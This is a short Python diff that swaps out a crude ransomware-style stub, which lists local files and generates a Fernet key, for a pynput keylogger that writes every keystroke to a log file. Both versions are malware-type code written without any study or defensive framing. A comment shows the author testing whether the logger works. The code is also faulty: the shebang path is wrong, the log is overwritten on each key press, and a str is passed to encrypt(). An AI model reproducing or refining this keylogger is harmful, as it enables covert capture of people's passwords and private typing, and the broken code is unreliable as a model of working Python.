@@ -1,15 +1,9 @@
 #!/usr/lib/env python3
-import os
-from cryptography.fernet import Fernet
-files = []
-for file in os.listdir():
-    if file == 'decrypt.py' or file == 'encrypt.py'or file == 'thekey.key':
-        continue
-    if os.path.isfile(file):
-        files.append(file)
-key = Fernet.generate_key()
-print(Fernet(key).encrypt('suhaya'))
+from pynput.keyboard import Listener
+def on_press(key):
+    with open('log.txt','w') as f:
+        f.write(str(key))
 
-print(files)
-
-print(key)
+with Listener(on_press) as listerner:
+        listerner.join()
+            # le me see if it works let se no
